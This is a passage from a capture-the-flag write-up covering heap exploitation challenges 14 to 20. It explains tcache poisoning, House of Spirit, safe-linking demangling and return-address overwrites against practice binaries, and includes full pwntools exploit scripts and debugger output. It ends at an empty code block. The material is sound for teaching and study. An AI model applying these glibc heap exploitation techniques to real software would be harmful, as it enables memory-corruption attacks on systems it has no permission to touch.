    print(f'stack_leak: {hex(stack_pointer_leak)}')

    secret_addr = stack_pointer_leak + 0x81
    allocate_chunk_at_addr(p, secret_addr, 0x80)  # arbitrary size
    allocate_chunk_at_addr(p, secret_addr - 8, 0x80)
    print(f'Nullified secret at addr: {hex(secret_addr)}')

    # allocate_chunk_at_addr(p, secret_addr + 0x1e, 0x80)  # Nullify the second qword
    send_flag(p, b'\x00' * 16)

    p.interactive()
```

## Challenge 14

Now we have to obtain control flow over the program. There's a `win` function exists within the binary. We should retrieve a PIE program leak to resolve it, which can be done via the `echo` handler - which sets a PIE pointers into a chunk returned by `malloc(0x20)`. As long as we can read a pointer of a slot, we can easily obtain this value. \
Moreover, we'd need a stack leakage - which can be obtained by performing House of Spirit - writing a fake chunk on the stack via `stack_scanf`, and injecting it into the tcachebin via `stack_free`. 

Finally, we'd utilize arbitrary write primitive (by tcache poisioning) to overwrite `main_ra` into `win`. 

One caveat of this challenge, is the fact we dont have read primitive via `puts`, hence we won't be able to trivially leak the stack of a chunk's `next` ptr. However, recall we do have PIE leak. This means we can obtain easily a libc leak using `echo`, and from there - a stack leak via `environ`. \
But do we actually need this? We can write directly to the stack leak, up to 127 bytes. Is the RA close enough? yup - but there's canary. Hence linear stack write won't help us, unless we'd leak its value. 

However, we can leak the canary trivially - as it is a simple offset compared to the leak stack pointer (leaking it off the `fsbase` within `ld` would also be possible, but harder). Notice the canary starts with an LSB of `\x00`, which should stop `echo` from reading. Can be bypassed by setting offset larger by `1`. 

By debugging, we can see the offset of `main_ra` to the `stack_ptr` stands for `0x58` bytes. Moreover, the canary resides `0x10` bytes before `main_ra`. \
Another simple approach, is to leak the stack pointer using `echo` - recall we've performed tcache poisoning, having the stack pointer stored as the `next` of some chunk. This means that by `echo`ing this chunk with an offset of 0, we should leak the stack value. 

```python
def exploit():
    p = process(BINARY)
    p.recvuntil(b'quit): ')

    # Leak PIE program addr
    echo_chunk_size = 0x20
    malloc(p, 0, echo_chunk_size)
    free(p, 0)
    bin_echo_offset = next(p.elf.search(b"/bin/echo"))
    pie_base = echo(p, 0, 0) - bin_echo_offset
    assert(pie_base & 0xfff == 0)
    win_addr = pie_base + p.elf.symbols['win']
    print(f'win_addr: {hex(win_addr)}')
    
    # Leak stack addr
    alloc_size = 0xa0  # arbitrary size
    buf = b'A' * 0x30
    buf += b'B' * 8  # prev_size
    buf += struct.pack(b'<Q', (alloc_size & 0xf0) + 0x11)  # size. 
    malloc(p, 0, alloc_size)
    stack_scanf(p, buf)
    stack_free(p)
    free(p, 0)
    stack_pointer_leak = echo(p, 0, 0)  # leak the next_ptr of the chunk
    print(f'stack_pointer_leak: {hex(stack_pointer_leak)}')

    # Overwrite main_ra to win
    main_ra = stack_pointer_leak + 0x58
    allocate_chunk_at_addr(p, main_ra, 0x80)  # arbitrary size
    buf_2 = struct.pack('<Q', win_addr + 5)
    scanf(p, 3, buf_2)
    
    p.sendline(b'quit')
    p.interactive()
```

## Challenge 15

Now there are no stack operations, but only `echo` and `read`. At a first glance, it seems that we can easily obtain PIE program and stack leaks using `echo`. Then, by using the `read` handler we can write into our goal chunk - which would be the return address. \
However, upon trying to leak the PIE program address, nothing is being printed!

By inspecting the binary closely, we can see that now, **all ptrs within the slots are being nullified upon a `free`**. This means the UAF vuln is actually closed! However, by introducing the `read` handler, notice it doesn't verifies the chunk's size before reading data into the chunk. Hence, this introduces a new vuln - a linear heap overflow. \
Moreover, since there are no `size` checks within `echo`, we can overcome this in a clever manner. We'd have to make sure we have some allocated chunk within `tcachebin[0x20]`, resides before the allocation that would be made by `echo`. In that case, by simply supplying larger than expected offsets, we can leak the second chunk values using the first chunk. 

My current goal is to fake the `next` member of some chunk, in order to leverage it towards arbitrary write. The idea is simple:

1. Allocate chunk of size `0x30` at slot `0`: `malloc(0, 0x30)`.

2. Another `malloc(1, 0x30)`

3. Another `malloc(2, 0x30)`

4. `free(2)`

5. `free(1)` - Now the head of the tcachebin, having `next` that isn't `NULL`

6. Read `0x30 + 0x10 + write_addr` bytes to slot `0`. That way, we would set the `next` ptr of the second chunk to address of our wish, instead of some legitimate value. Important - while we dont really care for the value of `prev_size`, we do care about the value of `size`. Hence, we'd have to supply it with the original value of `0x41`. 

7. `malloc(3, 0x30)` - would reuse the second chunk, which we've freed

8. `malloc(4, 0x30)` - would be allocated at an arbitrary address we control. Using `read` into it, we obtain arbitrary write primitive. 

Notice that because the `read` can only read up to 127 bytes, we wouldn't like to deal with large chunks, as they would require larger paddings. 

An interesting caveat I've encountered, was when the overwritten chunk was the head of the tcachebin, but there were no other chunks in it (meaning, its `next` was `NULL`, and the amount of total chunks within the bin was `1`). Because of the allocation at `step 3`, size of that bin was decreased to `0`. A libc optimization looks at the size of the bin within the `tcache_perthread_struct` before actually referencing the bin. In case it is `0`, it won't even access the `next` pointer. Hence, my exploit didn't work before adding the allocation and freeing of `slot[2]`. 

```python
def read(p, index, size, buf):
    p.sendline(b'read')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
    p.readline()
    p.send(buf)
    p.recvuntil(b'quit): ')

def exploit():    
    p = process(BINARY)
    p.recvuntil(b'quit): ')

    # Leak PIE program addr and stack
    echo_chunk_size = 0x20
    malloc(p, 0, echo_chunk_size)
    bin_echo_offset = next(p.elf.search(b"/bin/echo"))
    pie_base = echo(p, 0, echo_chunk_size + 0x10) - bin_echo_offset
    assert(pie_base & 0xfff == 0)
    main_ra = echo(p, 0, echo_chunk_size + 0x18) + 374
    win_addr = pie_base + p.elf.symbols['win']
    print(f'win_addr: {hex(win_addr)} main_ra: {hex(main_ra)}')

    # Overwrite main_ra to win
    chunk_size = 0x30  # doesn't really matters, as long as it is < 0x80 - 0x10
    malloc(p, 0, chunk_size)
    malloc(p, 1, chunk_size)
    malloc(p, 2, chunk_size)
    free(p, 2)
    free(p, 1)

    buf = b'B' * chunk_size
    buf += b'C' * 8  # fake prev_size
    buf += struct.pack('<Q', chunk_size + 0x11)  # Restore original size
    buf += struct.pack('<Q', main_ra)  # Fake next
    read(p, 0, chunk_size + 0x18, buf)
    malloc(p, 3, chunk_size)  # Reclaim our freed chunk. Now the bin's head points to our goal address!
    malloc(p, 4, chunk_size)  # Allocated at our goal address :)
    buf_2 = struct.pack('<Q', win_addr + 5)
    read(p, 4, len(buf_2), buf_2)  # Overwrite it
    
    p.sendline(b'quit')
    p.interactive()
```

## Challenge 16

First safe-linking challenge. Now we're provided with `libc` and `ld` the binary uses. \
The challenge seems identical to challenge 9, but this time with safe linking. Recall my solution approach there - instead of "leaking" the secret, I've actually aimed to nullify its value. \
To do this, I've overwritten the `next` ptr of a tcache within a bin, forcing the allocation to be performed from an address of my wish. 

At this level, we can easily leak a mangled `next` ptr of a chunk - by simply calling `puts` on a freed chunk. \
In order to demangle it, recall the mangling formula:

```c
(&ptr >> 12) ^ ptr
```

In our case, the `ptr` is the `next` pointer value, while `&ptr` is its address - hence the chunk address. Both of them are heap addresses, hence we can bypass this mangling. \
Also recall that the rightmost nibble of a valid `next` is always `0`. \
Within my exploitation, I've wrote `demangle_ptr`, a method that decrypts a `mangled_ptr`. The idea is to utilize the fact that the 3 leftmost nibbles of the mangled pointer are the 3 leftmost nibbles of the key. Hence, this allows us to obtain the next 3 nibbles of the key by xoring the first (MSBs) 3 nibbles of the mangled pointer with the next 3 nibbles, and continue this process recursively. 

This also means that if we make sure all allocations are being performed within the same heap pages, they would all use **the exact same mangling key**. \
Hence, once obtaining a mangled pointer (that resides within the same page as the chunk it points to), we can forge arbitrary mangled next pointers within the same page. 

Once having the option to mangle and demangle pointers, my current goal is as challenge 9 - to nullify all 16 bytes of the secret. \
However, notice the secret resides on `0x10` aligned address. The `p->key = 0` trick would only work for the second qword, and because now we can no longer allocate chunks that aren't aligned to `0x10`, we won't be able to nullify the first qword of the secret. \
This made me thinking of a bit different approach. We already have arbitrary-alloc-at-goal-address primitive, and we have the goal address. The only problem is that upon `malloc` invocation, a boundary check is being made, and nullifies the corresponding slot, hence making this pointer inaccessible by `puts` call. \
But recall the current state of the allocated `secret` chunk. Its first qword are completely random 8 bytes (`next`), and the `key` is `NULL`. If we would trick the allocator, so that `next` would be overwritten, we can optionally brute force much less amount of bytes. Even better - if we obtain heap leakage, we may have no need to brute force at all. \
This means we can solve this by calling `free` on the secret-allocated chunk. However, it doesn't seem we have any option to do so, as there's no state where any of the slots may contain a non-heap pointer. 

Another finding, is that `scanf` handler isn't trivial. Notice it performs the write because on the amount returned by `malloc_usable_size`. Under the hood, this method just parses the `size` member of the chunk. This means that if we would overwrite this member, we can actually obtain a forward heap overflow primitive. Can be very useful, as we are able to perform allocations to the start of `secret` and write towards them:

```c
static size_t
musable (void *mem)
{
  mchunkptr p = mem2chunk (mem);

  if (chunk_is_mmapped (p))
    return chunksize (p) - CHUNK_HDR_SZ;
  else if (inuse (p))
    return memsize (p);

  return 0;
}

/* extract p's inuse bit */
#define inuse(p)							      \
  ((((mchunkptr) (((char *) (p)) + chunksize (p)))->mchunk_size) & PREV_INUSE)
```

This means that if we would corrupt the size of the chunk that contains `secret` as its `next` ptr, making sure the "next fake chunk" contains its `PREV_INUSE` set, we would be able to fool the allocator, obtaining the option to linearly write into the large allocated `secret` address. \
However, this approach won't work (maybe unless we would wrap around the VA space), as the boundary check properly validates the allocation is above `secret + 0x10000`, where the real secret is actually located at `secret + 0x9a10`. 

Another approach is overwriting `tcache_perthread_struct`. \
Recall it actually resides within the start of the heap, meaning at the start of our chunk's page. Hence, we can easily resolve its addresses, and overwrite it to our wish. In particular, we can artbitrarly read and write its content. 

Lets say we would overwrite some tcachebin head to our target address. In that case, upon calling `free` on another chunk, the target address would be written as the `next` of the recently freed chunk. \ The thing is, upon an allocation of our secret, if it was the head of the tcachebin, the new tcachebin head would actually be filled with the **first** 8 bytes of the secret! \
This means that upon an allocation of the fake chunk, in addition to nullifying the second qword of the target address, it actually leaks its first 8 bytes into the tcache perthread struct! By allocating another fake chunk right at the tcache perthread struct, we can easily leak the 8 bytes value. 

Lastly, notice that the 3 lsbs of the first qword of the secret, stored within the `tcache_perthread_struct` are actually being overwritten for some reason. By reading `tcache_get_n` for glibc-2.40, I've noted the following:

```c
if (ep == &(tcache->entries[tc_idx]))
      *ep = REVEAL_PTR (e->next);
  else
    *ep = PROTECT_PTR (ep, REVEAL_PTR (e->next));
```

This means that upon malloc, in addition to writing the `next` ptr of the chunk into the tcache perthread struct, it also either protects or reveals it! This means that upon targeting the secret, located at `0x439a10`, the actual value that would be stored within the tcachebin head is `(*0x439a10) ^ 0x439`. Funny impact of safe-linking. 

```python
def new_allocate_chunk_at_addr(p, addr, size, key):
    '''
    Allocates chunk at specified addr, taking safe-linking into account. 
    The result is accessible within slot[3]
    '''
    assert((addr & 0xf) == 0)

    buf = struct.pack('<Q', addr ^ key)
    malloc(p, 0, size)
    malloc(p, 1, size)
    free(p, 1)
    free(p, 0)  # Now slot[0] chunk's next is pointing to slot[1]
    scanf(p, 0, buf)  # Overwrite its next pointer to our addr
    malloc(p, 2, size)  # Allocate slot[0], now the head of the freelist points to the secret
    malloc(p, 3, size)  # Now the chunk is allocated on the addr, which address is stored on slot 3!

    return

def demangle_ptr(mangled_ptr):
    ptr_size = len(mangled_ptr)
    mangled_value = mangled_ptr + b'\x00' * (8 - ptr_size)
    mangled_value = struct.unpack('<Q', mangled_value)[0]
    nibbles = textwrap.wrap(hex(mangled_value)[2:], 3)
    key = 0
    for nibble in nibbles[:-1]:
        nibble_val = int(nibble, 16)
        new_key = nibble_val ^ (key & 0xfff)
        key = key << 12
        key += new_key
    
    ptr = mangled_value ^ key

    return ptr, key

def exploit():    
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    secret_addr = 0x439a10
    print(f'secret_addr: {hex(secret_addr)}')

    chunk_size = 0x20  # Arbitrary size
    malloc(p, 0, chunk_size)
    malloc(p, 1, chunk_size)
    free(p, 1)
    free(p, 0)
    mangled_next_ptr = puts(p, 0)
    demangled_ptr, key = demangle_ptr(mangled_next_ptr)
    tcachebin_head_0x30 = (demangled_ptr & 0xfffffffffffff000) + 0xa0
    print(f'mangled_next_ptr: {mangled_next_ptr} demangled_ptr: {hex(demangled_ptr)} tcachebin_head_0x30: {hex(tcachebin_head_0x30)} key: {hex(key)}')
    
    
    # Arbtirary sizes, but don't collied with other tcachebin
    chunk_size_2 = chunk_size + 0x10
    new_allocate_chunk_at_addr(p, secret_addr, chunk_size_2, key)  # Nullify second qword of the flag, by allocating a fake chunk into it
    # A side effect of the above allocation, is having the first qword of the flag stored into the tcachebin head, of bin correponding to chunk_size_2. 
    # Allocate another chunk right there, so that we would be able to leak the value
    
    chunk_size_3 = chunk_size + 0x50
    new_allocate_chunk_at_addr(p, tcachebin_head_0x30, chunk_size_3, key)

    protected_secret_qword = puts(p, 3)
    secret_qword = struct.unpack('<Q', protected_secret_qword)[0] ^ (secret_addr >> 12)
    print(f'first_secret_qword_revealed: {hex(secret_qword)}')
    my_secret = struct.pack('<Q', secret_qword) + b'\x00' * 8
    send_flag(p, my_secret)

    p.interactive()
```

## Challenge 17

In a similar manner to before, we have stack and pie leaks, for safe-linking compiled binary. \
While allocating a chunk on `main_ra-8` is trivial, writing isn't - as `scanf` handler calls `malloc_usable_size`, and based on that value performs the read. \
This means we should perform the allocation elsewhere, making sure we corrupt `size` to some adequate value. I've chose the stack address of `s1` - the input read buffer, as we can fully control its content. \
The internals of `malloc_usable_size` is to first verify the `PREV_INUSE` of the expected next chunk is on. This can be easily aquired - all we have to do is to set large enough chunk size, so that the fake next chunk would contain LSb of 1. 

Another interesting approach is by looking carefuly at the stack content. Recall we can allocate chunk everywhere on the stack, and on the pointers array specifically. This means we can fake a pointer there, hence - using the `puts` handler we would achieve arbitrary read primitive, using `free` - arbitrary free primitive, and using `scanf` - if we can make sure it have an adequate `size`, limited write primitive. \
But arbitrary `free` is all we need - recall that upon a `free`, the corresponding bin's head is being written to the freed chunk `next` member. \
Since we can fake the tcachebin head to anything we wish, upon freeing a chunk next (which is the target address to write at), the bin's head would be written into it! However, notice this method would only work for aligned addresses, and set garbage at the `key` offset of the fake freed-chunk. \
Another approach we can try is overwriting the tcachebin head within the `tcache_perthread_struct`. If we would `malloc` a new chunk of that corresponding bin, we would obtain arbitrary alloc primitive, having the possibility of arbtirary write into it (as long as we set its `size` to some adequate value). \
This means we can obtain arbitrary linear overflow, for aligned addresses. In our case it might be handy, but we have to leak the canary first. Doing so isn't trivial at all, as its LSB is 0. We can utilize the same trick as level 16, where we've exploited `malloc` side effect of writing the `next` of the tcachebin head into the perthread_struct, hence - possibly writing the canary this way.

Another, this time completely wacky idea, is utilize the way allocations are being written to the pointers array:

```c
ptr[v6] = malloc(v10);
// ASM:
call _malloc
mov rdx, rax
mov eax, [rbp - 0x160h]
mov [rbp+rax*8+ptr], rdx
```

As we've seen, we can manipulate the returned addressed by `malloc` to nearly anything, as long as it is aligned to `0x10` and dereferenceable. \
However, we cannot easily change `ptr` value - as it is a flat array stored on the local stack frame. Hence, purely controlled by `rbp` value (which we do not directly control). \
The key finding here is that `v6` is actually a local variable stored on the stack. If we would corrupt its value, we should obtain arbtrirary stack OOB-W - which is much more adequate for this case than a linear stack overflow (as we won't need any canary leak)! \
An interesting finding, is while IDA parses `v6` (index for `ptr` within `malloc` handler) and `v7, v8, v9` (indices for `free, puts, scanf`) as separate variabls, they are all located at the exact same memory address, `[rbp - 0x160]`. This might mean we can manipulate the value of `v6` by messing up with some other handler..?

There are few compilcations though. The first and obvious - at the start of the `malloc` handler, there's a correct boundary check regarding `v6` value. `v6` is defined as an unsigned integer, hence the comparison isn't vulnerable (the compared value is immediate, not stored in memory nor register). Second, `v6` is being overwritten for every invocation of `malloc` handler. \
Both of these together means one thing - we cannot call the `malloc` handler twice, where the first allocation would overwrite `v6` and the second one would perform the OOB-W. The only solution is within a single `malloc` call we'd overwrite `v6`, making sure that call would return our address to-be-written. The write cannot be done by the `scanf` handler, but only via `malloc` mechanism. \
Recall `malloc` actually writes twice - for the allocated chunk, it sets its `key` to `NULL`, and for the tcache, navigates to the tcachebin head, fetches its `next`, and writes it within the perthread_struct. This means that in order to exploit this scenario, we have to overwrite the `tcache_perthread_struct` pointer. \
By closely debugging `malloc` implementation, I've found out the `tcache_perthread_struct` for glibc-2.40 is located at `ld` memory mapping, as it is being retrieved using the `fs` register, offset `-72`. 

```bash
0x7f115b5460d6 <malloc+54>     mov    rbx, qword ptr [rip + 0x173ccb]     RBX, [0x7f115b6b9da8] => 0xffffffffffffffb8                                                                                                                                 
0x7f115b5460dd <malloc+61>     mov    rdx, qword ptr fs:[rbx]             RDX, [0x7f115b49e740] => 0x7f115b49e740

pwndbg> fsbase
0x7f115b49e740
pwndbg> x/10gx 0x7f115b49e740-72
0x7f115b49e6f8: 0x0000557085437010      0x0000000000000000
```

This means that by leaking an `ld` address, we can forge a chunk within the linker memory area, overwriting the `tcache_perthread_struct` address itself. While this may work, this approach is wayyy too wacky, and too many stuff may break within allocations. 

Another idea involving direct exploitation of the `ptr` flat array, instead of its `v6` variable. \
We have the primitive of allocating a chunk at an arbitrary aligned address. In particular, we would be able to allocate it somewhere near the `ptr` flat buffer. However, in order to write into it, we have to pass the sanity check performed by `malloc_usable_size`, which fetches the chunk's `size` and compares `chunk + chunk_size` points to somewhere having `PREV_INUSE` set. While this seem non trivial to exploit, notice both `v6` and `v10` are controlled variables resides before the pointers array on the stack. While supplying invalid index for `v6` the program crashes, `v10` have no such limitation, and is fully controlled by the `size` supplied into `malloc`. Hence, by supplying an adequate `size` to malloc, and making sure the allocation would return right past `v10` (which is the exact address of `ptrs` array, as they're adjacent) - we should be able to forge a *writeable* chunk, right on the `ptrs` array! \
Later on, I've noticed an interesting behavior. While the `ptrs` array is located within `[rbp - 0x160]`, `v10` is actually located within `[rbp - 0x15c]`, not `[rbp - 0x158]` as need. However, my exploit DID work. By deeply inspected, I've seen the size of the chunk is constant `0x83`, regardless of my written `v10` value. By some debugging, I've seen the following wierd asm line within `main`, right before beginning the challenge. It cannot be seen at IDA, and hat was probably injected by the challenge's author:

```c
mov [rbp - 0x158], 83h
```

(Personally I think the challenge would've been cooler without it, as it was cooler to fake the size of the chunk ourselves)

```python
def exploit():
    p = process(BINARY)
    pointers_array = get_leak_addr(p)
    main_ra = pointers_array + 0x158
    pie_base = get_leak_addr(p) - p.elf.symbols['main']
    assert(pie_base & 0xfff == 0)
    win_addr = pie_base + p.elf.symbols['win']
    print(f'main_ra: {hex(main_ra)} pointers_array: {hex(pointers_array)} win_addr: {hex(win_addr)}')
    p.recvuntil(b'quit): ')

    chunk_size = 0x20  # Arbitrary size
    malloc(p, 0, chunk_size)
    malloc(p, 1, chunk_size)
    free(p, 1)
    free(p, 0)
    mangled_next_ptr = puts(p, 0)
    demangled_ptr, key = demangle_ptr(mangled_next_ptr)
    print(f'demangled_ptr: {hex(demangled_ptr)} key: {hex(key)}')

    # Allocate a chunk right on the pointers array, and store it at ptrs[0]
    # Important - Notice the challenge commercially have some legitimate value for 'size', right before the pointers_array chunk. This is intended.
    chunk_size_2 = chunk_size + 0x20 
    new_allocate_chunk_at_addr_in_slot(p, pointers_array, 0, chunk_size_2, key)

    # Overwrite ptrs[0] so now it would contain main_ra
    buf = struct.pack('<Q', main_ra)
    scanf(p, 0, buf)

    # Overwrite main_ra so it would contain the win address :)
    buf_2 = struct.pack('<Q', win_addr)
    scanf(p, 0, buf_2)

    p.sendline(b'quit')
    p.interactive()
```

## Challenge 18

Similar to challenge 13, but now there's safe linking. Moreover, the secret address isn't aligned, hence we cannot allocate a chunk over it. \
If we would allocate a chunk to the closest aligned address of the secret, we would nullify 8 bytes in the middle of the secret, and point 3 bytes prior to it. Because this memory region contains mostly `0`s, we won't be able to leak the first bytes using `puts`. \
Therefore, my idea is to use the same approach as challenge 16 - and to leak via the written `next` at the `tcache_perthread_struct`. 

```python
def exploit():
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    stack_ptr_to_secret_offset = 0xa3
    # House of spirit - free a fakely-generated chunk on the stack.
    # Also leak its mangled address
    chunk_size = 0x80
    buf = b'A' * 0x30
    buf += b'B' * 8  # prev_size
    buf += struct.pack(b'<Q', (chunk_size & 0xf0) + 0x11)  # create fake size
    malloc(p, 0, chunk_size)
    stack_scanf(p, buf)
    stack_free(p)
    free(p, 0)
    mangled_stack_ptr = puts(p, 0)

    # In order to obtain the heap key, we have to obtain a leak of the mangled heap pointer
    chunk_size_2 = chunk_size + 0x10
    malloc(p, 0, chunk_size_2)
    malloc(p, 1, chunk_size_2)
    free(p, 1)
    free(p, 0)
    mangled_heap_ptr = puts(p, 0)
    heap_ptr, heap_key = demangle_ptr(mangled_heap_ptr)  # Adapt this safe-linking to stack values as well
    heap_base = heap_ptr & 0xfffffffffffff000
    tcache_perthread_head_bin_0xb0 = heap_base + 0xe0
    print(f'tcache_perthread_head_bin_0xb0: {hex(tcache_perthread_head_bin_0xb0)} key: {hex(heap_key)}')

    # Decrypt the mangled stack pointer, using the heap key
    stack_ptr = struct.unpack('<Q', mangled_stack_ptr + b'\x00' * (8 - len(mangled_stack_ptr)))[0] ^ heap_key
    stack_key = stack_ptr >> 12
    print(f'stack_ptr: {hex(stack_ptr)} stack_key: {hex(stack_key)}')
    
    chunk_size_3 = chunk_size_2 + 0x10
    new_allocate_chunk_at_addr_in_slot(p, tcache_perthread_head_bin_0xb0, 3, chunk_size_3, heap_key)

    chunk_size_4 = chunk_size_3 + 0x10
    secret_addr = stack_ptr + stack_ptr_to_secret_offset
    aligned_secret_addr = secret_addr & 0xfffffffffffffff0
    print(f'secret_addr: {hex(secret_addr)} aligned_secret_addr: {hex(aligned_secret_addr)}')

    new_allocate_chunk_at_addr_in_slot(p, aligned_secret_addr, 2, chunk_size_4, heap_key)
    mangled_secret_qword_1 = puts(p, 3)
    mangled_secret_qword_1 = struct.unpack('<Q', mangled_secret_qword_1 + b'\x00' * (8 - len(mangled_secret_qword_1)))[0]
    secret_qword_1 = mangled_secret_qword_1 ^ stack_key
    new_allocate_chunk_at_addr_in_slot(p, aligned_secret_addr + 0x10, 2, chunk_size_4, heap_key)
    mangled_secret_qword_2 = puts(p, 3)
    mangled_secret_qword_2 = struct.unpack('<Q', mangled_secret_qword_2 + b'\x00' * (8 - len(mangled_secret_qword_2)))[0]
    secret_qword_2 = mangled_secret_qword_2 ^ stack_key
    print(f'q1:{hex(secret_qword_1)} q2:{hex(secret_qword_2)}')

    secret_alignment = stack_ptr_to_secret_offset & 0xf
    secret = struct.pack('<Q', secret_qword_1)[secret_alignment:]
    secret += b'\x00' * 8 
    secret += struct.pack('<Q', secret_qword_2)
    send_flag(p, secret)

    p.interactive()
```

## Challenge 18.1

Now the secret was allocated within address ends with nibble of `0xc` instead of `0x3`. This means we would overwrite different parts of the flag, hence these adjustments were made:

```python
secret = b'\x00' * 4
secret += struct.pack('<Q', secret_qword_2)
secret += b'\x00' * 4
```

## Challenge 19

Now wer'e given with 3 new handlers - `read_flag`, `safe_write`, `safe_read`. \
The `read_flag` handler reads the flag into a `malloc`'ed buffer. Hence, our goal in this challenge is to utilize overlapping allocations to leak the flag of the `buf`. Alternatively, We'd like to control the address returned by the flag's `malloc` call.

Moreover, this challenge keeps track of the allocated chunks sizes: for each `malloc` invocation, `size + 16` is stored with a dedicated `nbytes` array. In addition, `free` nullifies the pointer array. This means the UAF vuln is now closed. Notice however, that `free` handler doesn't touch the `nbytes` array at all. The method `safe_read` reads bytes amount from `stdin`, based on the value within `nbytes`. This means it is actually a write primitive into chunks. 

`safe_write` have some extremely sus behavior - it opens `STDOUT_FILENO` file stream using `fdopen`, which means it creates another file stream for `stdout`. It then uses `fwrite` instead of `write` on that stream. \
Since the stream is allocated dynamically on the heap, I highly suspect we can exploit it. In particular, notice that `read_flag` keeps the flag's `fd` open, without closing it after reading it into a heap buffer. Overwriting the internal `fd` of the stream won't help us, as it would redirect content into the flag. However, overwriting the internal buffer of the stream into the allocated flag's chunk, would grant us the flag. This also means that `read_flag` handler isn't actually needed, and challenge 20 is exactly same as 19 - but without this handler. 

Of course, the major vulnerability here is the fact that `size + 0x10` bytes may be written into a chunk of size `size`. This means we might be able to perform 16-byte heap linear forward write. \
For chunks of aligned malloc-request sizes, such as `0x20, 0x30`, the `prev_size` and `size` of the next chunk would be completely separate, having no overlap. \
However, for allocation requests with nibble of `0x8`, such as `0x38`, the `prev_size` field of the next chunk would be reused, so the chunk would be allocated off bin `0x40`! Moreover, this means that 16-byte overwrite in this case is sufficient in order to overwrite the `next` ptr of the preceding chunk. 

A simple approach would be causing double-free of a chunk, corresponding to the size of the flag's chunk. That way, we would be able to perform 2 allocations - for the flag and for a slot, and both would return the same address of the same chunk. \
However, recall that double free requires the option to overwrite the `key` member of a freed chunk - which we cannot do. \
Another approach is to overwrite the `next` ptr of a freed chunk, without changing the `size` of a chunk. That would grant us arbitrary-allocation primitive, which can be easly leveraged to arbitrary R/W primitives. \
Notice that we still need leaks to start from, and heap leaks in particular. These can be easily acquired. Assuming chunks `0, 1, 2` allocated adjacent on the heap, we can use the 16-byte OOB read to read 1's `next`, in case it is points to 2. To do so, all we have to do is to `free(2)`, then `free(1)`, then perform the OOB-R. 

Having arbtirary write, we can go for multiple directions:

1. Create the criterias for double free, and forge tcachebin corrsponding to the flag's chunk with 2 available slots, both to the same address. 

2. Having a heap leak, the address of the flag to-be-allocated is known. Therefore, we can overwrite an entry within the `tcache_perthread_struct`, so that some bin's head points to the address of the flag. Allocation from that bin would make us be accessible towards the flag chunk data. 

3. A more elegant way to perform the above, is by first allocating the flag's chunk, then overwriting the `next` of some tcachebin head chunk to the goal address, and performing 2 allocations off that bin. 

The following script implements idea(3), which is the simplest approach:

```python
def read_flag(p):
    p.sendline(b'read_flag')
    p.recvuntil(b'quit): ')

def safe_write(p, index):
    p.sendline(b'safe_write')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    # TODO: check these for the ".1" level. May be needed to change
    p.readline()
    p.readline()
    buf = p.readline()[:-1]
    p.recvuntil(b'quit): ')

    return buf

def safe_read(p, index, buf):
    p.sendline(b'safe_read')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    # TODO: this might be needed to change
    p.readline()
    p.send(buf)
    p.recvuntil(b'quit): ')

    return 

def main():    
    p = process(BINARY)
    p.recvuntil(b'quit): ')
    
    chunk_size = 0x88
    malloc(p, 0, chunk_size)
    malloc(p, 1, chunk_size)
    malloc(p, 2, chunk_size)
    free(p, 2)
    free(p, 1)
    buf = safe_write(p, 0)
    assert(len(buf) == chunk_size + 16)
    heap_next, heap_key = demangle_ptr(buf[-8:])
    print(f'heap_next: {hex(heap_next)} heap_key: {hex(heap_key)}')

    read_flag(p)
    flag_chunk_addr = heap_next + 0x670
    print(f'flag_chunk_addr: {hex(flag_chunk_addr)}')

    chunk_size_2 = 0x88
    malloc(p, 0, chunk_size_2)
    malloc(p, 1, chunk_size_2)
    malloc(p, 2, chunk_size_2)
    free(p, 2)
    free(p, 1)
    buf_2 = b'A' * chunk_size_2
    buf_2 += struct.pack('<Q', chunk_size_2 + 8 + 1)  # Keep the original chunk siz
    buf_2 += struct.pack('<Q', flag_chunk_addr ^ heap_key)  # Overwrite next to our goal chunk
    safe_read(p, 0, buf_2)
    
    malloc(p, 0, chunk_size_2)
    malloc(p, 0, chunk_size_2)
    flag_buf = safe_write(p, 0)
    print(f'flag_buf: {flag_buf}')

    p.interactive()
```

## Challenge 20

Same as before, but we no longer have any flag being loaded to `malloc` chunk. Moreover, there's no `win` function or anything, hence at the end, we'd have to execute ROP chain. \
My idea is to utilize the fact that we have a file stream being allocated on the heap. 

While we can easly get arbitrary R / W primitives (and heap leak) in the same manner as challenge 19, we still miss stack and PIE program leaks. Using the allocated file stream, we can easly get a libc address, and from there - read `environ` and having a stack leak. \
A possible approach the author was intended, is to use file stream exploit, aka - overwrite the `_IO_base_ptr` or `_IO_write_ptr`, to achieve R / W primitive (which we already have) or alternatively, the `vtable` and `wide_data`, to achieve control flow primitive. But as stated, all of these aren't really needed in that case - we can do so solely based on the leaks that resides within the heap, overwriting the stack and performing a ROP chain.  

Indeed, we can see the file stream has been allocated on the heap, and left a `libc` leak there, as we can see in offset `0x4d8`:

```bash
pwndbg> probeleak 0x5588c814d000 0x5000
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
0x00c8: 0x00005588c814d350 = (rw-p) [heap] + 0x350
0x0478: 0x00005588c814d650 = (rw-p) [heap] + 0x650
0x0480: 0x00005588c814d650 = (rw-p) [heap] + 0x650
0x0488: 0x00005588c814d650 = (rw-p) [heap] + 0x650
0x0490: 0x00005588c814d650 = (rw-p) [heap] + 0x650
0x0498: 0x00005588c814d650 = (rw-p) [heap] + 0x650
0x04a0: 0x00005588c814d650 = (rw-p) [heap] + 0x650
0x04a8: 0x00005588c814d650 = (rw-p) [heap] + 0x650
0x04b0: 0x00005588c814da50 = (rw-p) [heap] + 0xa50
0x04d8: 0x00007fa4448516a0 = (rw-p) /challenge/lib/libc.so.6 + 0x16a0 (_IO_2_1_stderr_)
0x04f8: 0x00005588c814d550 = (rw-p) [heap] + 0x550
0x0510: 0x00005588c814d560 = (rw-p) [heap] + 0x560
0x0548: 0x00007fa44484d600 = (r--p) /challenge/lib/libc.so.6 + 0x1600 (_IO_file_jumps)
0x0640: 0x00007fa44484d0c0 = (r--p) /challenge/lib/libc.so.6 + 0x10c0 (_IO_wfile_jumps)
```

Hence, upon obtaining the stack leak, as well as forging the heap's R / W primitives, we can easily create a ROP chain. \
I've implemented `arbitrary_read` and `arbitrary_write` methods, to make my solution as elegant as possible:

```python
